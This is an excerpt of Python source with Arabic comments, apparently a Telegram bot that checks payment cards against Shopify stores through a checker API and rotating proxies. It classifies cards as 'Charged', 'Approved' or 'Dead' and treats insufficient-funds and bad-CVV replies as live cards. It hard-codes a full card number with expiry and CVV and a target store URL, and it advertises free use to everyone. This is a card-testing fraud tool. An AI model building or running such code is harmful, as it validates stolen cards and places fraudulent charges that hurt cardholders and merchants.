...
_DEAD_INDICATORS = (
    ...
    'missing proxy param', 'proxy_dead', 'site_error', 'ssl routines',
)
...
async def check_card(card, site, proxy):
    try:
        ...
        # ✅ التعديل الأساسي: استخدام 'Response' بدلاً من 'Status'
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        
        # التحقق من أخطاء الموقع
        ...
        # ✅ Charged (تم الشحن)
        if 'CHARGED' in response_upper or 'ORDER COMPLETED' in response_upper or 'THANK YOU' in response_upper:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        
        # ✅ Approved (موافقة - كارت حي)
        elif response_upper == 'APPROVED':
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        
        # ✅ Insufficient Funds = كارت حي لكن رصيد غير كافي
        elif 'INSUFFICIENT' in response_upper:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        
        # ✅ Invalid CVV = كارت حي لكن CVV خطأ
        elif 'INVALID_CVV' in response_upper or 'INVALID CVC' in response_upper or 'INCORRECT_CVV' in response_upper:
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        ...
        # ❌ أخطاء الموقع
            ...
            return {'status': 'Site Error', 'message': 'CAPTCHA required', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        ...
        # افتراضي
            ...
            return {'status': 'Dead', 'message': response_msg or 'Unknown response', 'card': card, 'site': site, 'gateway': gate, 'price': price}
        ...
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True, 'gateway': 'Unknown', 'price': '-'}
...
async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://cleetusm.myshopify.com"
    try:
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg or 'missing proxy param' in response_msg:
...
async def clean_command(event):
    ...
    try:
        ...
        await status.edit("⚠️ auto_manager.py not found. Please add it.")
...
print("📡 API: " + CHECKER_API_URL)
print("👤 Owner: Mustafa")
print("🎯 Status: FREE MODE - Everyone can use")
print("=" * 50)
